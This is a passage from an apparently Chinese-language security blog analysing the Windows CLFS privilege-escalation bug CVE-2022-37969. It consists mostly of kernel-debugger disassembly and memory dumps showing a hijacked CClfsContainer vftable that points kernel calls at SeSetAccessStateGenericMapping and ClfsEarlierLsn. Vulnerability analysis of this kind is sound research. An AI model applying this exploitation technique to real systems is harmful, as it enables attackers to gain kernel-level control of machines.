style="color:#ae81ff">4885ff</span> test rdi, rdi</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ec6<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">84</span>b9000000 je CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>RemoveContainer<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d5</span> (fffff80011306f85)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ecc<span style="color:#ae81ff">4983671800</span> and qword ptr [r15<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h],<span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ed1<span style="color:#ae81ff">65488</span>b142588010000 mov rdx, qword ptr gs:[<span style="color:#ae81ff">188</span>h]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>eda<span style="color:#ae81ff">488</span>b4e20 mov rcx, qword ptr [rsi<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>h]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ede<span style="color:#ae81ff">4</span>c8b15c3d1ffff mov r10, qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">__imp_ExReleaseResourceForThreadLite</span> (fffff800113040a8)]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ee5 e8a655c203 call ntkrnlmp<span style="color:#f92672">!</span><span style="color:#a6e22e">ExReleaseResourceForThreadLite</span> (fffff80014f2c490)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>eea<span style="color:#ae81ff">4532f</span><span style="color:#ae81ff">6</span> xor r14b, r14b</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>eed<span style="color:#ae81ff">4488742420</span> mov byte ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>h], r14b</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ef2<span style="color:#ae81ff">488</span>b07 mov rax, qword ptr [rdi]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ef5<span style="color:#ae81ff">488</span>b4018 mov rax, qword ptr [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ef9<span style="color:#ae81ff">488</span>bcf mov rcx, rdi</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>efc ff15ced6ffff call qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">__guard_dispatch_icall_fptr</span> (fffff800113045d0)]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306f</span><span style="color:#ae81ff">02</span><span style="color:#ae81ff">488</span>b07 mov rax, qword ptr [rdi]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306f</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">488</span>b4008 mov rax, qword ptr [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306f</span><span style="color:#ae81ff">09</span><span style="color:#ae81ff">488</span>bcf mov rcx, rdi</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306f</span><span style="color:#ae81ff">0</span>c ff15bed6ffff call qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">__guard_dispatch_icall_fptr</span> (fffff800113045d0)]</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db r15</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de4d8<span style="color:#ae81ff">08</span> f0 fd c1<span style="color:#ae81ff">30</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">08</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#ae81ff">.0</span>...........</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de4e8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>a0<span style="color:#ae81ff">93</span><span style="color:#ae81ff">50</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ..........P.....</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de4f8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de508<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de518<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de528<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de538<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de548<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> p</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>RemoveContainer<span style="color:#f92672">+</span><span style="color:#ae81ff">0x113</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ec3<span style="color:#ae81ff">4885ff</span> test rdi,rdi</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> rrdi</span></span><span style="display:flex;"><span>rdi<span style="color:#f92672">=</span><span style="color:#ae81ff">000000000050</span><span style="color:#ae81ff">93</span>a0</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dp rdi</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">93</span>a0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">93</span>b0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">93</span>c0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">93</span>d0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">005093e0</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">005093f</span><span style="color:#ae81ff">0</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9400</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9410</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23456789</span> fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da0</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000010</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cb0</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000020</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000030</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000040</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000050</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000060</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000070</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><p>该对象已经被用户层控制，<code>CClfsContainer</code>的vftable被指向05000000</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/16.png"/></p><p>在05000000+0x8和05000000+0x18处的两个函数指针分别是<code>SeSetAccessStateGenericMapping</code>和<code>ClfsEarlierLsn</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23456789</span> fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da0</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000010</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cb0</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000020</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000030</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000040</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000050</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000060</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000070</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> u fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da0</span></span><span style="display:flex;"><span>nt<span style="color:#f92672">!</span>SeSetAccessStateGenericMapping:</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da0<span style="color:#ae81ff">488</span>b4148 mov rax,qword ptr [rcx<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>h]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da4<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">1002</span> movups xmm0,xmmword ptr [rdx]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da7 f30f7f4008 movdqu xmmword ptr [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>],xmm0</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>dac c3 ret</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>dad cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>dae cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>daf cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>db0 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> u fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cb0</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn:</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cb0<span style="color:#ae81ff">488</span>b05c1240000 mov rax,qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">CLFS_LSN_INVALID</span> (fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">4178</span>)]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cb7<span style="color:#ae81ff">4885</span>c9 test rcx,rcx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cba<span style="color:#ae81ff">7436</span> je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf2)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cbc<span style="color:#ae81ff">488</span>b09 mov rcx,qword ptr [rcx]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cbf<span style="color:#ae81ff">483</span>b0d82210000 cmp rcx,qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">CLFS_LSN_NULL</span> (fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f3e48</span>)]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cc6<span style="color:#ae81ff">742</span>a je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf2)</span></span></code></pre></div><p>内核将依次调用<code>ClfsEarlierLsn</code>和<code>SeSetAccessStateGenericMapping</code></p><p>在<code>ClfsEarlierLsn</code>中edx被设为0xFFFFFFFF</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn:</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cb0<span style="color:#ae81ff">488</span>b05c1240000 mov rax, qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">CLFS_LSN_INVALID</span> (fffff800112f4178)]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cb7<span style="color:#ae81ff">4885</span>c9 test rcx, rcx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cba<span style="color:#ae81ff">7436</span> je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff800112f1cf2)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cbc<span style="color:#ae81ff">488</span>b09 mov rcx, qword ptr [rcx]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cbf<span style="color:#ae81ff">483</span>b0d82210000 cmp rcx, qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">CLFS_LSN_NULL</span> (fffff800112f3e48)]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cc6<span style="color:#ae81ff">742</span>a je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff800112f1cf2)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cc8<span style="color:#ae81ff">483</span>bc8 cmp rcx, rax</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>ccb<span style="color:#ae81ff">7425</span> je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff800112f1cf2)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>ccd<span style="color:#ae81ff">83</span>caff or edx,<span style="color:#ae81ff">0FF</span>FFFFFFh</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cd0<span style="color:#ae81ff">48894</span>c2408 mov qword ptr [rsp<span 